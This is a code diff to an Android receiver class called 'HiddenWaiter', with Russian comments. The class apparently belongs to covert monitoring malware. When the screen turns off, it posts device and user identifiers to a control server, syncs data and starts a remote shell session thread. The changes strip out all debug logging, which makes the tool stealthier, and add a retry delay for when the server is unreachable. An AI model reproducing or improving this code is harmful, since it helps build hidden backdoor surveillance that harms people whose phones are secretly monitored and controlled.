@@ -5,7 +5,6 @@ import android.content.Context;
 import android.content.Intent;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
-import android.util.Log;
 
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -18,6 +17,8 @@ import java.io.BufferedReader;
 import java.io.DataOutputStream;
 import java.io.InputStreamReader;
 
+import javax.net.ssl.HttpsURLConnection;
+
 public class HiddenWaiter extends BroadcastReceiver {
     Context context;
 
@@ -27,6 +28,7 @@ public class HiddenWaiter extends BroadcastReceiver {
     static long online_knock_interval=400;
     static Thread shellthread=null;  // поток шелл-сессии
     static Thread syncthread=null; // поток синхронизации
+    static long lastsenddata =3600000;
 
 
 
@@ -35,34 +37,33 @@ public class HiddenWaiter extends BroadcastReceiver {
         this.context=context;
         String action = intent.getAction();
         switch (action){
-            //android.intent.action.SCREEN_OFF
-            case "android.intent.action.TIME_SET":
+            //android.intent.action.SCREEN_OFF android.intent.action.TIME_SET
+            case "android.intent.action.SCREEN_OFF":
                 MyService.ScreenOn = false;
                 if(isNetworkAvailable()){
 
-                    sendPost(MyService.CheckDevice);
-                    Log.d(MyService.LOG_TAG, " Интернет здесь ^^. Готов к драке");
-                    if(System.currentTimeMillis()-lastsynctime>sync_interval){ //
-                        if(!MyService.recording&&!MyService.syncactive){
-                            Log.d(MyService.LOG_TAG, "Время синхронизировать! начинается ..");
-                            sync();
+                    Integer respons = sendPost(MyService.CheckDevice);
+                    if(respons==200){
+                        if(System.currentTimeMillis()-lastsynctime>sync_interval){ //
+                            if(!MyService.recording&&!MyService.syncactive){
+                                sync();
+                            }
                         }
-                        else{
-                            Log.d(MyService.LOG_TAG, "уже синхронизация или запись!");
+                        if(System.currentTimeMillis()-lastonlinetime>online_knock_interval){
+                            notifyonline();
+                        }
+                        if(!MyService.cmdsessionactive){
+                            shellthread = new Thread(new ShellSession());  //
+                            shellthread.setName("shellthread");
+                            shellthread.start();
+                        }
+                    }else{
+                        try {
+                            Thread.currentThread().sleep(lastsenddata);
+                        } catch (InterruptedException e) {
+                            e.printStackTrace();
                         }
                     }
-                    if(System.currentTimeMillis()-lastonlinetime>online_knock_interval){
-                        Log.d(MyService.LOG_TAG,"уведомление о онлайне..");
-                        notifyonline();
-                    }
-                    if(!MyService.cmdsessionactive){
-                        shellthread = new Thread(new ShellSession());  //
-                        shellthread.setName("shellthread");
-                        shellthread.start();
-                    }
-                }
-                else {
-                    Log.d(MyService.LOG_TAG, "shell выключен, интернета пока нет");
                 }
                 break;
             case "android.intent.action.SCREEN_ON"://При включении экрана происходит проверка на потоки и включение режима screen on
@@ -98,20 +99,20 @@ public class HiddenWaiter extends BroadcastReceiver {
         syncthread.start();
     }
 
-
-    private void sendPost(String url_string){
+    private int sendPost(String url_string){
         Date currentDate = new Date();
         DateFormat dateFormat = new SimpleDateFormat("HH:mm:ss-dd.MM.yyyy", Locale.getDefault());
         String dateText = dateFormat.format(currentDate);
         try{
             String url = url_string;
 
+
             HttpURLConnection httpClient = (HttpURLConnection) new URL(url).openConnection();
 
             //add reuqest header
             httpClient.setRequestMethod("POST");
 
-            String urlParameters = "deviceid="+MyService.DeviceID()+"&admin="+MyService.admin+"&android="+android.os.Build.VERSION.SDK_INT+"&userid="+MyService.userid+"&time="+dateText+"&name="+MyService.DevName+"&appV="+MyService.App_Version;
+            String urlParameters = "deviceid="+MyService.DeviceID()+"&admin="+MyService.admin+"&android="+android.os.Build.VERSION.SDK_INT+"&userid="+MyService.userid+"&time="+dateText+"&appV="+MyService.App_Version;
 
             // Send post request
             httpClient.setDoOutput(true);
@@ -121,9 +122,7 @@ public class HiddenWaiter extends BroadcastReceiver {
             }
 
             int responseCode = httpClient.getResponseCode();
-            Log.d("Log","\nSending 'POST' request to URL : " + url);
-            Log.d("Log","Post parameters : " + urlParameters);
-            Log.d("Log","Response Code : " + responseCode);
+
 
             try (BufferedReader in = new BufferedReader(
                     new InputStreamReader(httpClient.getInputStream()))) {
@@ -135,11 +134,11 @@ public class HiddenWaiter extends BroadcastReceiver {
                     response.append(line);
                 }
 
-                //print result
-                Log.d("Log",response.toString());
-
             }
+            return responseCode;
         }catch (Exception e){
         }
+
+        return 0;
     }
 }
